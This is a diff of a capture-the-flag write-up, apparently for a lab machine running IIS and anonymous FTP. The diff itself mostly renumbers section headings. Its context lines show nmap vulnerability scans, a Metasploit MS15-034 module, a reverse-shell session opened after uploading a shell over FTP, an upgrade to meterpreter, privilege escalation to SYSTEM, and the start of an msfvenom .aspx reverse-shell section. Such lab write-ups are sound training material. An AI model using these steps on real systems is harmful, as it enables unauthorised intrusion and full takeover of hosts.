@@ -1,18 +1,33 @@
 # Summary
-### 1. x
+### 1. Another Day, Another NMAP
 x
 
-### 2. x
+### 2. First Attack, MS15-034, CVE-2015-1635
 x
 
-### 3. x
+### 3. NMAP, Second Attempt
 x
 
-### 4. x
+### 4. Finding Vulnerabilties for FTP & IIS
+x
+
+### 5. Reverse Shell Execution
+x
+
+### 6. Privilege Escalation Failed Attempts
+x
+
+### 7. Fixing Errors and Getting Meterpreter for Privilege Escalation!
+x
+
+### 8. Privilege Escalation
+x
+
+### 9. Alternative Reverse Shell, with Meterpreter & MSFVenom
 x
 
 # Attack
-## Another Day, Another NMAP
+## 1. Another Day, Another NMAP
 ```
 hippoeug@kali:~$ nmap -sC -sV -A --script=vuln 10.10.10.5 -v -Pn
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-27 23:20 +0
@@ -68,7 +83,7 @@ PORT   STATE SERVICE
 |_      https://technet.microsoft.com/en-us/library/security/ms15-034.aspx
 ```
 
-## First Attack, MS15-034, CVE-2015-1635
+## 2. First Attack, MS15-034, CVE-2015-1635
 Ezgame, another metasploit module!
 ```
 msf5 > use auxiliary/scanner/http/ms15_034_http_sys_memory_dump
@@ -139,7 +154,7 @@ msf5 > use auxiliary/scanner/http/ms15_034_http_sys_memory_dump
 ```
 Ah crap, nothing interesting mang. Back to searching for vulnerabilties.
 
-## NMAP, Second Attempt
+## 3. NMAP, Second Attempt
 ```
 hippoeug@kali:~$ nmap -sC -sV 10.10.10.5 -Pn -v
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-27 23:44 +08
@@ -167,7 +182,7 @@ Going to `http://10.10.10.5`, we see the IIS welcome page.
 Trying `http://10.10.10.5/iisstart.htm` and `http://10.10.10.5/welcome.png` as seen on the FTP server, we get results! 
 So they're indeed connected and linked! FTP could be a good vector to attack from! Let's check the FTP out.
 
-## Finding Vulnerabilties for FTP & IIS
+## 4. Finding Vulnerabilties for FTP & IIS
 We see FTP on Port 21 has `Anonymous FTP login allowed (FTP code 230)`
 ```
 msf5 > use auxiliary/scanner/ftp/anonymous
@@ -184,7 +199,7 @@ Doing some research ([Source](https://www.atlantic.net/what-is-an-iis-server/)),
 
 Interesting, scripts for `.NET`, `ASPX` and `PHP` is supported. 
 
-## Reverse Shell Execution
+## 5. Reverse Shell Execution
 We can choose between `.NET`, `ASPX` and `PHP` scripts, but let me first attempt to upload a PHP reverse shell. 
 Upload to FTP [source](https://www.howtoforge.com/tutorial/how-to-use-ftp-on-the-linux-shell/).
 
@@ -234,7 +249,7 @@ msf5 exploit(multi/handler) > run
 [*] Command shell session 1 opened (10.10.x.x:4545 -> 10.10.10.5:49163) at 2020-11-28 18:40:59 +0800
 ```
 
-## Privilege Escalation Failed Attempts
+## 6. Privilege Escalation Failed Attempts
 Let's try somethings with metasploit.
 ```
 msf5 > use post/multi/manage/shell_to_meterpreter
@@ -370,7 +385,7 @@ C:\Windows\system32 NT SERVICE\TrustedInstaller:(F)
 ```
 We don't find anything interesting we can use, or know how to use unfortunately.
 
-## Fixing Errors and Getting Meterpreter for Privilege Escalation!
+## 7. Fixing Errors and Getting Meterpreter for Privilege Escalation!
 I made a huge error. Time to make things right as rain.
 
 The reason why `msf5 > use post/multi/manage/shell_to_meterpreter` failed previously was because default payload `generic/shell_reverse_tcp` for `exploit/multi/handler` was used instead of `windows/shell/reverse_tcp`.
@@ -413,7 +428,7 @@ Active sessions
 ```
 Heck yeah! We got a meterpreter shell!
 
-## Privilege Escalation
+## 8. Privilege Escalation
 ```
 meterpreter > getuid
 Server username: IIS APPPOOL\Web
@@ -529,7 +544,7 @@ meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
 ```
 
-## Alternative Reverse Shell, with Meterpreter & MSFVenom
+## 9. Alternative Reverse Shell, with Meterpreter & MSFVenom
 NOTE: THIS IS AN ALTERNATE METHOD AS SHOWN IN OFFICIAL WRITE-UP
 
 Let's generate a custom `.aspx` reverse shell. [Source](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-a-reverse-shell-in-Metasploit)
